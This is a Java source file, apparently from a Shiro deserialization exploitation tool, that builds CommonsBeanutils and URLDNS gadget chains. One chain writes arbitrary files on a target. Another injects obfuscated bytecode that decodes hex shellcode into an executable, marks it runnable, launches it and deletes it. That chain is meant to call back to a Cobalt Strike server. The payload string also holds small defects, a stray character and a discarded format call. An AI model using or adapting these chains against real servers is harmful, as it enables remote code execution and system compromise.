package Util;


import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import org.apache.commons.beanutils.BeanComparator;

import java.lang.reflect.Field;
import java.net.URL;
import java.util.*;

public class GadGets {
    // 爆破结束后可用的利用链
    List availableGadgets = new ArrayList();
    // 实现指定方法摘取

    /**
     * methodName 匹配方法名称
     * 可变长参数接受需要的值 每种链 需要的参数各不相同
     *
     * @param methodName
     * @param parameter
     * @return
     */
    public static Object findMethod(String methodName, String... parameter) throws Exception {

        if (methodName.equals("CBString WriteFIle(默认)")) {
            CB1(parameter[0], parameter[1]);
        } else if (methodName.equals("URLDNS")) {
            URLDNS(parameter[0]);
        } else if (methodName.equals("CB反弹CS")) {
            CB1Exec(parameter[0]);
        }
        return null;
    }


//    static class BlastThread extends Thread {
//        @Override
//        public void run() {
//            Thread.currentThread().setName("子线程");
//
//            // 写反射代码 获取当前类下所有方法 排除不需要方法
//            // 爆破利用链时 不爆破到一个就停止 爆破所有利用链 全部存储 然后选中随机利用链代码进行利用
//
//            for (int i = 0; i < 5; i++) {
//                System.out.println(Thread.currentThread().getName() + "---" + i);
//            }
//        }
//    }


//    public static Object blastGadgets() {
//        BlastThread myThread = new BlastThread();
//        myThread.start();  //开辟新线程
//        for (int i = 0; i < 5; i++) {
//            System.out.println(Thread.currentThread().getName() + "---" + i);
//        }
//        return "CB1";
//    }

    /**
     * CB String ShellCode执行链
     *
     * @param fileContent
     * @return
     * @throws Exception
     */
    public static PriorityQueue CB1Exec(String fileContent) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass payload = pool.makeClass(randomClassName());
        payload.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
        // 创建类构造器代码
        CtConstructor constructor = new CtConstructor(new CtClass[]{}, payload);
        String payStr = "{\n" +
                "StringBuffer OumFpdtWO = new StringBuffer();\n" +
                "        OumFpdtWO.append(\"%s\");\n" +
                "        String ACvQufdjkUlCUzq = System.getProperty(\"java.io.tmpdir\") + \"/UgNQKFeYBrUiH\";\n" +
                "\n" +
                "        if (System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") != -1) {\n" +
                "         y   ACvQufdjkUlCUzq = ACvQufdjkUlCUzq.concat(\".exe\");\n" +
                "        }\n" +
                "\n" +
                "        int ZYOLGixIbAH = OumFpdtWO.length();\n" +
                "        byte[] SBkuJuwWQCk = new byte[ZYOLGixIbAH / 2];\n" +
                "        for (int nHTFeapqT = 0; nHTFeapqT < ZYOLGixIbAH; nHTFeapqT += 2) {\n" +
                "            SBkuJuwWQCk[nHTFeapqT / 2] = (byte) ((Character.digit(OumFpdtWO.charAt(nHTFeapqT), 16) << 4)\n" +
                "                    + Character.digit(OumFpdtWO.charAt(nHTFeapqT + 1), 16));\n" +
                "        }\n" +
                "\n" +
                "        FileOutputStream PGjwnJmEi = new FileOutputStream(ACvQufdjkUlCUzq);\n" +
                "        PGjwnJmEi.write(SBkuJuwWQCk);\n" +
                "        PGjwnJmEi.flush();\n" +
                "        PGjwnJmEi.close();\n" +
                "\n" +
                "        if (System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") == -1) {\n" +
                "            String[] eTjGmrdx = new String[3];\n" +
                "            eTjGmrdx[0] = \"chmod\";\n" +
                "            eTjGmrdx[1] = \"+x\";\n" +
                "            eTjGmrdx[2] = ACvQufdjkUlCUzq;\n" +
                "            Process HcMnvXKQYOws = Runtime.getRuntime().exec(eTjGmrdx);\n" +
                "            if (HcMnvXKQYOws.waitFor() == 0) {\n" +
                "                HcMnvXKQYOws = Runtime.getRuntime().exec(ACvQufdjkUlCUzq);\n" +
                "            }\n" +
                "\n" +
                "            File IuSMglkaIU = new File(ACvQufdjkUlCUzq);\n" +
                "            IuSMglkaIU.delete();\n" +
                "        } else {\n" +
                "            String[] fecgBqEcF = new String[1];\n" +
                "            fecgBqEcF[0] = ACvQufdjkUlCUzq;\n" +
                "            Process HcMnvXKQYOws = Runtime.getRuntime().exec(fecgBqEcF);\n" +
                "        }" +
                "}";
        String.format(payStr, fileContent);
        System.out.println(payStr);
        constructor.setBody(payStr);
        payload.addConstructor(constructor);

        byte[] evilClass = payload.toBytecode();
        TemplatesImpl templates = new TemplatesImpl();

        setFieldValue(templates, "_bytecodes", new byte[][]{evilClass});
        setFieldValue(templates, "_name", "test");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

        BeanComparator beanComparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, beanComparator);
        queue.add("1");
        queue.add("1");

        setFieldValue(beanComparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{templates, templates});

        return queue;
    }

    /**
     * URLDNS 利用链
     *
     * @param urldns
     * @return
     * @throws Exception
     */
    public static HashMap URLDNS(String urldns) throws Exception {
        HashMap<URL, Integer> hashmap = new HashMap<URL, Integer>();
        URL url = new URL(urldns);
        Class urlClass = url.getClass();
        Field field = urlClass.getDeclaredField("hashCode");//得到URL类的hashCode字段（默认为-1）
        //getDeclaredFields：获取当前类的所有字段，包括 protected/默认/private 修饰的字段；不包括父类public 修饰的字段。
        field.setAccessible(true);
        field.set(url, 3);//设置url的hashCode值为3
        hashmap.put(url, 1);//
        field.set(url, -1);
        return hashmap;
    }

    /**
     * 改造过的CB链 不需要cc依赖 简称Shiro无依赖CB链
     *
     * @param fileName
     * @param fileContent
     * @return
     * @throws Exception
     */
    public static PriorityQueue CB1(String fileName, String fileContent) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass payload = pool.makeClass(randomClassName());
        payload.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
        // 创建类构造器代码
        CtConstructor constructor = new CtConstructor(new CtClass[]{}, payload);
        constructor.setBody("{\n" +
                "    java.util.Formatter formatter = new java.util.Formatter(new java.io.File(\"" + fileName + "\"));\n" +
                "    formatter.format(\"%s\", new Object[]{\"" + fileContent + "\"});\n" +
                "    formatter.close();\n" +
                "}");
        payload.addConstructor(constructor);

        byte[] evilClass = payload.toBytecode();
        TemplatesImpl templates = new TemplatesImpl();

        setFieldValue(templates, "_bytecodes", new byte[][]{evilClass});
        setFieldValue(templates, "_name", "test");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

        BeanComparator beanComparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, beanComparator);
        queue.add("1");
        queue.add("1");

        setFieldValue(beanComparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{templates, templates});

        return queue;
    }

    /**
     * 工具类 简化反射流程
     *
     * @param object
     * @param fieldName
     * @param value
     * @throws Exception
     */
    private static void setFieldValue(Object object, String fieldName, Object value) throws Exception {
        Field field = object.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(object, value);
    }

    private static String randomClassName() {
        String characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        Random random = new Random();
        StringBuilder sb = new StringBuilder();

        for (int i = 0; i < 8; i++) {
            int index = random.nextInt(characters.length());
            char randomChar = characters.charAt(index);
            sb.append(randomChar);
        }
        return sb.toString();
    }
}
